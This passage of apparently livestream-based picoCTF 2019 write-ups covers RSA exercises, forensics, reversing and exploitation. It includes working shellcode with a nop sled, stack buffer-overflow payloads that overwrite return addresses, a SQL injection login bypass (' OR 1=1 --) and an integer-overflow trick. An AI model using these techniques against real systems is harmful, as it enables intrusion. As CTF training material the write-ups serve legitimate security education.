100  2115  100  2115    0     0  11882      0 --:--:-- --:--:-- --:--:-- 11815
         <!-- <strong>Title</strong> --> picobrowser!
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{p1c0_s3cr3t_ag3nt_bbe8a517}</code></p>
```

## plumbing - General Skills
```console
$ nc -v 2019shell1.picoctf.com 21957 | grep pico
Connection to 2019shell1.picoctf.com 21957 port [tcp/*] succeeded!
picoCTF{digital_plumb3r_c1082838}
```
## rsa-pop-quiz - Cryptography

You must know [RSA](https://en.wikipedia.org/wiki/RSA_(cryptosystem)) for this task, but "it's really simple."

Connect to the quiz using netcat:
```console
$ nc -v 2019shell1.picoctf.com 61751
Connection to 2019shell1.picoctf.com 61751 port [tcp/*] succeeded!
Good morning class! It's me Ms. Adleman-Shamir-Rivest
Today we will be taking a pop quiz, so I hope you studied. Cramming just will not do!
You will need to tell me if each example is possible, given your extensive crypto knowledge.
Inputs and outputs are in decimal. No hex here!
```
#### Question 1:
```
#### NEW PROBLEM ####
q : 60413
p : 76753
##### PRODUCE THE FOLLOWING ####
n
IS THIS POSSIBLE and FEASIBLE? (Y/N):y
#### TIME TO SHOW ME WHAT YOU GOT! ###
n:
```

It's possible to calculate n since `n = q*p`.  
Solve for n:
```pycon
$ python
>>> q = 60413
>>> p = 76753
>>> n = q*p
>>> n
4636878989
```

#### Question 2: 
```
#### NEW PROBLEM ####
p : 54269
n : 5051846941
##### PRODUCE THE FOLLOWING ####
q
IS THIS POSSIBLE and FEASIBLE? (Y/N):y
#### TIME TO SHOW ME WHAT YOU GOT! ###
q:
```

Just use `q = n/p` and some python.

```pycon
$ python
>>> 5051846941/54269
93089
```

#### Question 3:
```
#### NEW PROBLEM ####
e : 3
n : 12738162802910546503821920886905393316386362759567480839428456525224226445173031635306683726182522494910808518920409019414034814409330094245825749680913204566832337704700165993198897029795786969124232138869784626202501366135975223827287812326250577148625360887698930625504334325804587329905617936581116392784684334664204309771430814449606147221349888320403451637882447709796221706470239625292297988766493746209684880843111138170600039888112404411310974758532603998608057008811836384597579147244737606088756299939654265086899096359070667266167754944587948695842171915048619846282873769413489072243477764350071787327913
##### PRODUCE THE FOLLOWING ####
q
p
IS THIS POSSIBLE and FEASIBLE? (Y/N):n
```

n is quite large (2049 bytes), so factoring n to try and get the prime numbers (p and q) would be take way too long. There's no fast way to factor n. 

#### Question 4:
```
#### NEW PROBLEM ####
q : 66347
p : 12611
##### PRODUCE THE FOLLOWING ####
totient(n)
IS THIS POSSIBLE and FEASIBLE? (Y/N):y
#### TIME TO SHOW ME WHAT YOU GOT! ###
totient(n):
```
Use this equation `totient(n) = (q-1)*(p-1)` and python to calculate it

```pycon
$ python
>>> ( 66347-1)*(12611-1)
836623060
```


#### Question 5:
```
#### NEW PROBLEM ####
plaintext : 6357294171489311547190987615544575133581967886499484091352661406414044440475205342882841236357665973431462491355089413710392273380203038793241564304774271529108729717
e : 3
n : 29129463609326322559521123136222078780585451208149138547799121083622333250646678767769126248182207478527881025116332742616201890576280859777513414460842754045651093593251726785499360828237897586278068419875517543013545369871704159718105354690802726645710699029936754265654381929650494383622583174075805797766685192325859982797796060391271817578087472948205626257717479858369754502615173773514087437504532994142632207906501079835037052797306690891600559321673928943158514646572885986881016569647357891598545880304236145548059520898133142087545369179876065657214225826997676844000054327141666320553082128424707948750331
##### PRODUCE THE FOLLOWING ####
ciphertext
IS THIS POSSIBLE and FEASIBLE? (Y/N):y
```
Encryption: `Ciphertext = plaintext^e mod n`

Use python:
```pycon
$ python
>>> m = 6357294171489311547190987615544575133581967886499484091352661406414044440475205342882841236357665973431462491355089413710392273380203038793241564304774271529108729717
>>> e = 3
>>> n = 29129463609326322559521123136222078780585451208149138547799121083622333250646678767769126248182207478527881025116332742616201890576280859777513414460842754045651093593251726785499360828237897586278068419875517543013545369871704159718105354690802726645710699029936754265654381929650494383622583174075805797766685192325859982797796060391271817578087472948205626257717479858369754502615173773514087437504532994142632207906501079835037052797306690891600559321673928943158514646572885986881016569647357891598545880304236145548059520898133142087545369179876065657214225826997676844000054327141666320553082128424707948750331
>>> c = pow(m, e, n)
>>> c
256931246631782714357241556582441991993437399854161372646318659020994329843524306570818293602492485385337029697819837182169818816821461486018802894936801257629375428544752970630870631166355711254848465862207765051226282541748174535990314552471546936536330397892907207943448897073772015986097770443616540466471245438117157152783246654401668267323136450122287983612851171545784168132230208726238881861407976917850248110805724300421712827401063963117423718797887144760360749619552577176382615108244813L
```

#### Question 6:
```
#### NEW PROBLEM ####
ciphertext : 107524013451079348539944510756143604203925717262185033799328445011792760545528944993719783392542163428637172323512252624567111110666168664743115203791510985709942366609626436995887781674651272233566303814979677507101168587739375699009734588985482369702634499544891509228440194615376339573685285125730286623323
e : 3
n : 27566996291508213932419371385141522859343226560050921196294761870500846140132385080994630946107675330189606021165260590147068785820203600882092467797813519434652632126061353583124063944373336654246386074125394368479677295167494332556053947231141336142392086767742035970752738056297057898704112912616565299451359791548536846025854378347423520104947907334451056339439706623069503088916316369813499705073573777577169392401411708920615574908593784282546154486446779246790294398198854547069593987224578333683144886242572837465834139561122101527973799583927411936200068176539747586449939559180772690007261562703222558103359
##### PRODUCE THE FOLLOWING ####
plaintext
IS THIS POSSIBLE and FEASIBLE? (Y/N):n
```
You need the private key, d, to get the plaintext. And in order to get d, you need q and p, but we only have n and e.

#### Question 7:

Use python
```pycon
$ python
>>> ​from Crypto.Util.number import inverse
>>> q = 92092076805892533739724722602668675840671093008520241548191914215399824020372076186460768206814914423802230398410980218741906960527104568970225804374404612617736579286959865287226538692911376507934256844456333236362669879347073756238894784951597211105734179388300051579994253565459304743059533646753003894559
>>> p = 97846775312392801037224396977012615848433199640105786119757047098757998273009741128821931277074555731813289423891389911801250326299324018557072727051765547115514791337578758859803890173153277252326496062476389498019821358465433398338364421624871010292162533041884897182597065662521825095949253625730631876637
>>> e = 65537
>>> totient = (q-1)*(p-1)
>>> d = inverse(e, totient)
>>> d
1405046269503207469140791548403639533127416416214210694972085079171787580463776820425965898174272870486015739516125786182821637006600742140682552321645503743280670839819078749092730110549881891271317396450158021688253989767145578723458252769465545504142139663476747479225923933192421405464414574786272963741656223941750084051228611576708609346787101088759062724389874160693008783334605903142528824559223515203978707969795087506678894006628296743079886244349469131831225757926844843554897638786146036869572653204735650843186722732736888918789379054050122205253165705085538743651258400390580971043144644984654914856729L
```

#### Question 8:
```
#### NEW PROBLEM ####
p : 153143042272527868798412612417204434156935146874282990942386694020462861918068684561281763577034706600608387699148071015194725533394126069826857182428660427818277378724977554365910231524827258160904493774748749088477328204812171935987088715261127321911849092207070653272176072509933245978935455542420691737433
ciphertext : 9276182891752530901219927412073143671948875482138883542938401204867776171605127572134036444953137790745003888189443976475578120144429490705784649507786686788217321344885844827647654512949354661973611664872783393501992112464825441330961457628758224011658785082995945612195073191601952238361315820373373606643521463466376095236371778984942891123936191796720097900593599447528583257806196551724676380135110693228330934418147759387990754368525068685861547977993085149359162754890674487823080750579601100854795031284533864826255207300350679553486505961837349042778851010569582458629638648589442067576234798724906377157351
e : 65537
n : 23952937352643527451379227516428377705004894508566304313177880191662177061878993798938496818120987817049538365206671401938265663712351239785237507341311858383628932183083145614696585411921662992078376103990806989257289472590902167457302888198293135333083734504191910953238278860923153746261500759411620299864395158783509535039259714359526738924736952759753503357614939203434092075676169179112452620687731670534906069845965633455748606649062394293289967059348143206600765820021392608270528856238306849191113241355842396325210132358046616312901337987464473799040762271876389031455051640937681745409057246190498795697239
##### PRODUCE THE FOLLOWING ####
plaintext
IS THIS POSSIBLE and FEASIBLE? (Y/N):y
#### TIME TO SHOW ME WHAT YOU GOT! ###
plaintext: 
```

Python:
```pycon
$ python
>>> ​from Crypto.Util.number import inverse
>>> p = 15314304227252786879841261241720443415693514687428299094
2386694020462861918068684561281763577034706600608387699148071015
1947255333941260698268571824286604278182773787249775543659102315
2482725816090449377474874908847732820481217193598708871526112732
1911849092207070653272176072509933245978935455542420691737433
>>> c = 92761828917525309012199274120731436719488754821388835429
3840120486777617160512757213403644495313779074500388818944397647
5578120144429490705784649507786686788217321344885844827647654512
9493546619736116648727833935019921124648254413309614576287582240
1165878508299594561219507319160195223836131582037337360664352146
3466376095236371778984942891123936191796720097900593599447528583
2578061965517246763801351106932283309344181477593879907543685250
6868586154797799308514935916275489067448782308075057960110085479
5031284533864826255207300350679553486505961837349042778851010569
582458629638648589442067576234798724906377157351
>>> e = 65537
>>> n = 23952937352643527451379227516428377705004894508566304313177880191662177061878993798938496818120987817049538365206671401938265663712351239785237507341311858383628932183083145614696585411921662992078376103990806989257289472590902167457302888198293135333083734504191910953238278860923153746261500759411620299864395158783509535039259714359526738924736952759753503357614939203434092075676169179112452620687731670534906069845965633455748606649062394293289967059348143206600765820021392608270528856238306849191113241355842396325210132358046616312901337987464473799040762271876389031455051640937681745409057246190498795697239
>>> q = n/p
>>> totient = (q-1)*(p-1)
>>> d = inverse(e, totient)
>>> m = pow(c, d, n)
>>> m
14311663942709674867122208214901970650496788151239520971623411712977119642137567031494784893L
```

To get the flag, just convert the above message to hex and then to ascii
```pycon
$ python
>>> hex(14311663942709674867122208214901970650496788151239520971623411712977119642137567031494784893)[2:-1].decode('hex')
'picoCTF{wA8_th4t$_ill3aGal..o1828d357}'
```

Some attacks: If e is too small

## slippery-shellcode - Binary Exploitation
Check for
```console
$ checksec --file ./vuln
[*] '/problems/slippery-shellcode_4_64839254839978b32eb661ca92071d48/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```
`NX disabled` means the stack is executable in this case  
`No PIE` means ASLR (Address Space Layout Randomization) is basically disabled, so the starting address is constant.

Vulnerable code:
```c
void vuln(char *buf){
  gets(buf);
  puts(buf);
}
```
The gets() function is prone to buffer overflows and so we can put any character (even '\0' bytes) in the buffer except '\n'.

This line of code just executes the buffer: `((void (*)()))(buf + offset))();`.  

We need a nopsled since the code randomizes where we run the buffer.  

We can use a nopsled to fill the buffer so that it doesn't really matter where in the nopsled the cpu starts executing from. 

For our shellcode, we can use c library functions, since the binary is statically linked:
```console
$ file vuln
vuln: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=df86b06c60f9f6b307f6d381d8498245c4d3691c, not stripped
```
32-bit shellcode

You could use some shellcode from the internet or create your own. Gynvael decides to write his own custom shellcode for fun using fopen/fgets.

Open the binary in IDA or Ghidra or objdump to find the addresses of the functions.  

System is not in the binary unfortunately, but fopen is, so we can use it to open the flag.txt.  

Shellcode:

```assembly
[bits 32]
times 256 nop ; makes a nop sled with 256 nop instructions

; the call instruction pushes the next 'instruction' onto the stack 
; or in this case the address of the "r" string which is the 2nd parameter of fopen
call n2 

db "r", 0 ; open the file in read mode

n2:
  call n1 ; the call instruction pushes the address of the "flag.txt" string which is the 1st parameter of fopen
  db "flag.txt", 0

n1:
  mov eax, 0x8050170 ;this is the address of fopen
  call eax

  ; push fgets parameters (LIFO order)
  push eax ; eax is where fopen stores the file ptr (3rd parameter of fgets)
  push 64  ; number of characteres to read (2nd parameter of fgets)
  push 0x80DC11C ; this is an address in memory Gynvael found to write our flag (use IDA, Ghidra, or objdump to find some blank memory)

  mov eax, 0x8052660 ; fgets address (Use IDA or Ghidra or objdump to find this)
  call eax

  mov eax, 0x8050320 ; puts address
  call eax

  nop
 
```
Save above shellcode as a file like asdf.asm and then compile
```console
$ nasm asdf.asm
```
This produces a binary called asdf

To pass the shellcode as input to the program:
```console
$ cat ~/asdf | ./vuln

Enter your shellcode:
Thanks! Executing from a random location now...
picoCTF{sl1pp3ry_sh311c0d3_3d79d4df}
Segmentation fault (core dumped)
```
For an actual ctf, Gynvael recommends not writing your own shellcode due to time constraints.

## vault-door-3 - Reverse Engineering
Gynvael gets stuck trying to create a mapping table, so he tries another way:

Just take the part of the java code that does the scrambling and creates the simple anagram
```java
for (i=0; i<8; i++) {
    buffer[i] = password.charAt(i);
}
for (; i<16; i++) {
    buffer[i] = password.charAt(23-i);
}
for (; i<32; i+=2) {
    buffer[i] = password.charAt(46-i);
}
for (i=31; i>=17; i-=2) {
    buffer[i] = password.charAt(i);
}
```

Convert to python to make it easier:
```python
for i in xrange(0, 8):
    buffer[i] = password[i]
for i in xrange(8, 16):
    buffer[i] = password[23-i]
for i in xrange(16, 32, 2):
    buffer[i] = password[46-i]
for i in xrange(31, 15, -2): # Note the >= in the above java for loop
    buffer[i] = password[i]
```

Now use the above python to get the flag
```python
password = bytearray([x for x in range(32)]) # Generates an array with numbers from 0 to 31
buffer = bytearray(32)

s = bytearray("jU5t_a_sna_3lpm13gc49_u_4_m0rf41")

# This gets the correct order of indexes to descramble s
for i in xrange(0, 8):
    buffer[i] = password[i]
for i in xrange(8, 16):
    buffer[i] = password[23-i]
for i in xrange(16, 32, 2):
    buffer[i] = password[46-i]
for i in xrange(31, 15, -2):
    buffer[i] = password[i]

print str(buffer).encode("hex") # Now we have the indexes in buffer

p = bytearray(32)

for i, idx in enumerate(buffer):
  p[i] = s[idx] # Put all the letters in the right order

print p
```

## whats-the-difference - General Skills
Find the difference between the files using python:
```python
d = open("kitters.jpg", "rb").read() # Unmodified file
e = open("cattos.jpg", "rb").read() # modified file

f = ""

# Zip takes one element from d and one from e for every iteration
for a, b in zip(d, e):
  if a != b:
    f+=b

print f
```

## where-is-the-file - General Skills
Connect to the shell server  
```console
$ ssh username@2019shell1.picoctf.com
Enter your platform password (characters will be hidden):
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1060-aws x86_64)
...
username@pico-2019-shell1:~$ cd /problems/where-is-the-file_6_8eae99761e71a8a21d3b82ac6cf2a7d0 # Go to the problem folder
username@pico-2019-shell1:/problems/where-is-the-file_6_8eae99761e71a8a21d3b82ac6cf2a7d0$ ls -la # Show all files (including hidden ones that have a dot prefix)
total 80
drwxr-xr-x   2 root       root        4096 Sep 28  2019 .
drwxr-x--x 684 root       root       69632 Oct 10  2019 ..
-rw-rw-r--   1 hacksports hacksports    39 Sep 28  2019 .cant_see_me
username@pico-2019-shell1:/problems/where-is-the-file_6_8eae99761e71a8a21d3b82ac6cf2a7d0$ cat .cant_see_me
picoCTF{w3ll_that_d1dnt_w0RK_a88d16e4}
```

## WhitePages - Forensics
Gynvael wants to do a forensics before moving on to binary exploitation

Opening up in sublime shows what looks like a blank file  
Opening in a hex editor shows that there are in fact 2 characters (looks like UTF-8 chars). 

Replace the characters with visible ones (like # and .). If we make the data into 8 columns, we see that the first column always has the same character, which means it is probably ASCII binary data since all printable characters in ASCII use only 7 bits with the top bit being 0. Convert everything to 0's and 1's, making sure the top bit is 0.

Use python to convert binary to ascii
```pycon
$ python
>>> p = "00001010000010010000100101110000011010010110001101101111010000110101010001000110000010100000101000001001000010010101001101000101010001010010000001010000010101010100001001001100010010010100001100100000010100100100010101000011010011110101001001000100010100110010000000100110001000000100001001000001010000110100101101000111010100100100111101010101010011100100010000100000010100100100010101010000010011110101001001010100000010100000100100001001001101010011000000110000001100000010000001000110011011110111001001100010011001010111001100100000010000010111011001100101001011000010000001010000011010010111010001110100011100110110001001110101011100100110011101101000001011000010000001010000010000010010000000110001001101010011001000110001001100110000101000001001000010010111000001101001011000110110111101000011010101000100011001111011011011100110111101110100010111110110000101101100011011000101111101110011011100000110000101100011011001010111001101011111011000010111001001100101010111110110001101110010011001010110000101110100011001010110010001011111011001010111000101110101011000010110110001011111011000110011000100110110001101110011000000110100001100000110001100110111001100110011100001100101001110000110001001100011011000010110010100110010001100010011000000111001011001010110011000110100011000100110010100110101001110010011011000110000011000100011000101111101000010100000100100001001"
>>> int(p, 2) # Convert binary string to integer
>>> hex(int(p, 2)) # Convert integer to hex string
>>> hex(int(p, 2))[2:-1] # Remove the '0x' at the beginning of the hex string and remove the 'L' at the end
>>> ("0" + hex(int(p, 2))[2:-1]).decode("hex") # add a "0" as padding since it needs to be even length and then decode as hex
'\n\t\tpicoCTF\n\n\t\tSEE PUBLIC RECORDS & BACKGROUND REPORT\n\t\t5000 Forbes Ave, Pittsburgh, PA 15213\n\t\tpicoCTF{not_all_spaces_are_created_equal_c167040c738e8bcae2109ef4be5960b1}\n\t\t'
```

## c0rrupt - Forensics
Gynvael decides to do another forensics problem and saves the binary exploitation one for later.  

The file command just tells us the file is data.
```console
$ file mystery
mystery: data
```

Opening in a text editor reveals some strings like RGB, gAMA, etc. which tells us the file is probably a png.  

Use Gynvael's brute zlib decompressor code at [https://github.com/gynvael/random-stuff/tree/master/brute_zlib]. This code will just try decompressing the zlib data in a png.  

Just change `data, unused = DecompressStream(d[i:i+128])` to `data, unused = DecompressStream(d[i:i+1024000]) # Just change 128 to a  large number` since the mystery file is large. The png has a zlib marker so that when the decompression is done, the program will exit.

```console
$ python go.py ./mystery
Some data at 0000005b
Some data at 0000005d
Some data at 000003ff
Some data at 00000552
Some data at 00000907
...
$ ls -la
total 6880
drwxrwxrwx 1 root root    4096 May  6 15:29 .
drwxrwxrwx 1 root root    4096 May  6 15:21 ..
-rwxrwxrwx 1 root root 1431747 May  6 15:28 0000005b.bin
-rwxrwxrwx 1 root root 5399156 May  6 15:29 0000005d.bin
...
```
Notice that the `0000005d.bin` file is the largest, so it's probably the ones we want to look at. Change the extension to .data and use GIMP to look at the file.  
Open as Gray 8-bit and get the black dots to form a vertical line by increasing the width. 
The dots are probably the number of filters which are part of each scanline/row of the image, so when they are aligned in a verticalish line, we should have the correct with of the image.

The image should look something like this:
```
  .
   .
    .
     .
      .
       .
 . ..     ..    .....  ..                   .             . ...
 . . ..    .      .        .     ... . .      .    .             .
```

Set Image Type to RGB and you should see some legible text.  
Continue increasing the width and try to get the image more clear.  

Gynvael says the zlib decompression is probably not an intended solution, but it's nice trick if there's a zlib stream like ZIP, GZIP, HTTP compression, or a png.  

## m00nwalk - Forensics
Gynvael does another forensics challenge.  

Listen to the .wav file. Somehow Gynvael figures out it's SSTV (Slow Scan TV).  
SSTV: protocol to send images from satellites.

Gynvael uses the [RX-SSTV](http://users.belgacom.net/hamradio/rxsstv.htm) program and plays the .wav file to get the picture (using the Scottie1 option).  

SSTV is something you learn from CTFs and should know for CTFs.

## Overflow2 - Binary Exploitation
gets() is the vulnerable function which means any character in our input except '\n' (on windows other characters would be disallowed like Ctrl-D) 

We want to call flag() since that prints out the flag, but we see that it checks for function arguments.  

We have to push the flag function's arguments onto the stack as well as overwrite the return address with the address of the flag function in order to execute the flag function.
```c
void flag(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xC0DED00D)
    return;
  printf(buf);
}
```

Here's a diagram of what the stack should look like when the ret instruction is called (when vuln() returns):
```
0x080485E6 # This is the address of flag(), the address we want to jump to
Saved EBP # We can fill this with junk (AAAA in this case). This is where the above function will go to when it returns
0xDEADBEEF # Argument 1
0xC0DED00D # Argument 2
```

```
$ echo -e '\xE6\x85\x04\x08\x41\x41\x41\x41\xEF\xBE\xAD\xDE\x0D\xD0\xDE\xC0'
```
 
We still need to add some characters at the beginning to overflow the buffer. The amount of characters will probably be larger than the buffer length.
```
$ echo -e 'DDDDCCCCBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xE6\x85\x04\x08\x41\x41\x41\x41\xEF\xBE\xAD\xDE\x0D\xD0\xDE\xC0' | ./vuln
Please enter your string:
DDDDCCCCBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ
picoCTF{arg5_and_r3turn5001d1db0}Segmentation fault (core dumped)
```
We needed BUFLENGTH + 12 characters.

## NewOverFlow-1 - Binary Exploitation
#### 64-bit exploitation  
* 8 bytes instead of 4 bytes  
* Calling convention (arguments are in registers sometimes) 

Pretty much the same thing as the 32 bit one.  

Get the address of the flag:
```console
$ objdump -x vuln # Just display all the functions and things in the binary
...
0000000000000000       F *UND*  0000000000000000              fopen@@GLIBC_2.2.5
0000000000000000       F *UND*  0000000000000000              exit@@GLIBC_2.2.5
0000000000601070 g     O .data  0000000000000000              .hidden __TMC_END__
0000000000400767 g     F .text  0000000000000065              flag
00000000004005c8 g     F .init  0000000000000000              _init
``` 

We see that the address of flag() is 0x0000000000400767. The null bytes wont' affect gets() since gets() only ends at a newline.  

Our exploit format:
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA # Padding to reach the saved return address (Right now we don't know how many A's to use to pad it)
\x67\x07\x40\x00\x00\x00\x00\x00 # Address of flag() in little endian which overwrites whatever saved return address there was
```

Previously, we just guessed how much padding to add to overwrite the return addres, now Gynvael looks at the disassembly of the binary to see if we can calculate how many A's we need to overwrite the return address with the address of flag.   

Note: In the stream Gynvael looks at the flag() function disasssembly by mistake when he should in fact look at the vuln() function's disassembly to make the exploit since that's the function that calls gets(). 

```console
$ objdump -Mintel -d vuln
...
00000000004007cc <vuln>:
  4007cc:       55                      push   rbp
  4007cd:       48 89 e5                mov    rbp,rsp
  4007d0:       48 83 ec 40             sub    rsp,0x40
  4007d4:       48 8d 45 c0             lea    rax,[rbp-0x40]
  4007d8:       48 89 c7                mov    rdi,rax
  4007db:       b8 00 00 00 00          mov    eax,0x0
  4007e0:       e8 4b fe ff ff          call   400630 <gets@plt>
  4007e5:       90                      nop
  4007e6:       c9                      leave
  4007e7:       c3                      ret
...
```

As we can see from the disassembly above, when the `ret` instruction is called, the stack will look something like this:
```
[saved return address]
[saved rbp]
[0x40 bytes for buf]
```
So we need 64 A's to overwrite the buffer and then another 8 A's to overwrite the saved rbp for a total of 72. Then we can overwrite the saved return address with the address of flag().   

Exploit
```console
$ echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x67\x07\x40\x00\x00\x00\x00\x00" | ./vuln
Welcome to 64-bit. Give me a string that gets you the flag:
Segmentation fault (core dumped)
```

However, when the above, it doesn't seem to work. Let's run it in gdb:
```console
$ echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x67\x07\x40\x00\x00\x00\x00\x00" > ~/asdf # save the exploit to a file
$ gdb ./vuln
(gdb) r < ~/asdf # Run the program in gdb with the file's contents as our input
Starting program: /problems/newoverflow-1_4_3fc8f7e1553d8d36ded1be37c306f3a4/vuln < ~/asdf
Welcome to 64-bit. Give me a string that gets you the flag:
'flag.txt' missing in the current directory!
[Inferior 1 (process 2882877) exited normally]
```
It looks like the exploit actually worked in gdb. When you run a program using gdb it drops the permissions from the original binary which is why you have the program couldn't find flag.txt. The exploit worked in gdb but not outside of it because running a program in gdb changes the environment and program a little bit. Running the exploit locally also succeeds, but running on the shell server outside of gdb fails because there might be slight differences there.  

To confirm that we're actually overwriting the return address on the shell server outside of gdb, we can look for an instruction/function in the binary that will allow us to see if we have control of the return address. Gynvael looks for the 0xEBFE or infinite loop instruction in the binary, but there isn't one. Instead we can try calling `puts("Welcome to 64-bit. Give me a string that gets you the flag: ");` since that will show us if we overwrite the return address. This technique is a common strategy for confirming that we have control of the return address.  

These two lines are what we want called to call the puts() function in main().
```console
$ objdump -Mintel -d vuln
...
  400834:       48 8d 3d ed 00 00 00    lea    rdi,[rip+0xed]        # 400928 <_IO_stdin_used+0x48>
  40083b:       e8 b0 fd ff ff          call   4005f0 <puts@plt>
...
```

We want to call address 0x400834 since we need to load the string into rdi as a parameter before calling puts. Use that as the return address we're overwriting.
```console
$ echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x34\x08\x40\x00\x00\x00\x00\x00" | ./vuln
Welcome to 64-bit. Give me a string that gets you the flag:
Welcome to 64-bit. Give me a string that gets you the flag:
Bus error (core dumped)
```

We can see that the welcome message was printed twice, indidcating that we did indeed call puts by overwriting the stored return address on the stack. This confirms that we had the right amount of padding to overwrite the return address even though it seems ovewriting the return address with the address of flag() didn't work.  

The next technique we can try is using the address instruction after the start of flag() instead of the address of flag().
```assembly
0000000000400767 <flag>:
  400767:       55                      push   rbp # Instead of calling this
  400768:       48 89 e5                mov    rbp,rsp # we can maybe call this address
  40076b:       48 83 ec 50             sub    rsp,0x50 # or maybe even this one
  40076f:       48 8d 35 72 01 00 00    lea    rsi,[rip+0x172]        # 4008e8 <_IO_stdin_used+0x8>
```

Let's try 0x400768 instead of 0x400768 (address of flag()).
```console
$ echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x68\x07\x40\x00\x00\x00\x00\x00" | ./vuln
Welcome to 64-bit. Give me a string that gets you the flag:
picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_72d3e39f}
Segmentation fault (core dumped)
```

For some reason the program was crashing on the `push rbp` instruction (probably due to stack alignment). Later Gynvael says that Canonical compiled the new Ubuntu kernel with some flags that would make a program crash if the stack was misaligned.  

## like1000 - Forensics
Gynvael fails figure out how to use 7zip, then proceeds to try extracting the tar with the following script: 
```python
#!/usr/bin/python
import os
for i in xrange(1000, 0, -1):
  os.system('tar -xf %i.tar' % i)
  with open("filler.txt") as f:
    print(f.read())
```

The above script *does* work in getting the flag, but tar files are sort of just files concatenated together, so there's no need for the above script to process the tar in a recurisve way.  

Gynvael just opens up a hex editor and finds the magic header for the PNG (89 50 4e 47). He then deletes everything before that header and saves the file. Open in an image viewer as a png and there's the flag.

## vault-door-4 - Reverse Engineering
Just print the myBytes array:
```python
print bytearray([106 , 85  , 53  , 116 , 95  , 52  , 95  , 98  ,
            0x55, 0x6e, 0x43, 0x68, 0x5f, 0x30, 0x66, 0x5f,
            0142, 0131, 0164, 063 , 0163, 0137, 062 , 066 ,
            '7' , 'e' , '0' , '3' , 'd' , '1' , '1' , '6'])
```

## Irish-Name-Repo 1 - Web Exploitation
Test for SQL injection by putting `' "-` in the username. This leads to a `HTTP ERROR 500` which tells us it's probably vulnerable to SQL injection.  

When looking at the source, we see a hidden input field, so we set debug to 1
```html
<input type="hidden" name="debug" value="1">
```

When we sent the same payload as before (`' "-`), we get some debug output:
```sql
SQL query: SELECT * FROM users WHERE name='' "-' AND password=''
```
We want the query to look like this:
```sql
SELECT * FROM users WHERE name='' OR 1=1 -- 
```
The space after `--` matters since some versions of SQL need it there.
Send the following as the username:`' OR 1=1 -- `

## flag_shop - General Skills
This is the piece of code we want to execute to display the flag:
```c
if(account_balance > 100000) {
  FILE *f = fopen("flag.txt", "r");
  if(f == NULL){
      printf("flag not found: please run this on the server\n");
      exit(0);
    }
  char buf[64];
  fgets(buf, 63, f);
  printf("YOUR FLAG IS: %s\n", buf);
}
```
We need `account_balance`  to be greater than $100,000 to "buy" the flag, but unfortunately we only have $1100 in our account.  

Luckily `account_balance` is a signed integer, so `if(account_balance > 100000)` is vulnerable to an integer overflow/integer underflow attack.  

If we keep on subtracting from our account balance by buying a bunch of the fake flags, we can eventually get account_balance to be greater than $100,000.  

If we buy more than around 2 billion worth of flags, the worth of the flags will wrap around to around negative 2 billion. Then when we subtract a negative amount of money from our balance, it actually adds all that money to our account.  

Each "fake" flag costs 900 to buy, so we need to buy around 2386092 fake flags since 2147483647/900=2386092. But in order to get *past* 2147483647, we need more than that. We also need to take the intial balance of 1100 into account as well.  So we have to buy around 2386095 fake flags to get our account balance to a very large positive number. Then with that balance we can buy the real flag.
```console
$ nc 2019shell1.picoctf.com 63894
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
2386095

The final cost is: -2147481796

Your current balance after transaction: 2147482896

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_818a7f84}
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit
```

## asm1 - Reverse Engineering
We get this:
```assembly
asm1:
        <+0>:   push   ebp
        <+1>:   mov    ebp,esp
        <+3>:   cmp    DWORD PTR [ebp+0x8],0x767
        <+10>:  jg     0x512 <asm1+37>
        <+12>:  cmp    DWORD PTR [ebp+0x8],0x1f3
        <+19>:  jne    0x50a <asm1+29>
        <+21>:  mov    eax,DWORD PTR [ebp+0x8]
        <+24>:  add    eax,0xb
        <+27>:  jmp    0x529 <asm1+60>
        <+29>:  mov    eax,DWORD PTR [ebp+0x8]
        <+32>:  sub    eax,0xb
